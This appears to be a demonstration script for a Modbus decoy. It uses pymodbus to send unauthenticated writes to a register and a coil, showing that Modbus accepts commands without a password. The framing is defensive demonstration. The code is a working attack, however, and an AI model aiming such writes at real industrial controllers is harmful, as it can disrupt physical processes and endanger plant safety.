"""
Scenario 3 -- Unauthorised write.

Modbus has no authentication, so anyone who can reach the port can write. Here
we set a register (and a coil) to a bogus value. On a real plant this could be
dangerous; on our decoy it is logged and harmless, and the real PLC is never
touched (one-way mirror).

  python write_register.py <host> <port>
"""

import sys

from pymodbus.client import ModbusTcpClient

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 5021

client = ModbusTcpClient(host, port=port)
if not client.connect():
    print(f"[write] cannot connect to {host}:{port}")
    sys.exit(1)

print(f"[write] unauthorised write to {host}:{port}  (Modbus asks for no password)")
r1 = client.write_register(0, 1234)       # try to set the 'level' register
print("        write register 0 = 1234, accepted:", not r1.isError())
r2 = client.write_coil(0, True)           # try to flip a coil
print("        write coil 0 = ON,     accepted:", not r2.isError())
client.close()
print("        -> the decoy logged both writes; the real PLC is unaffected")
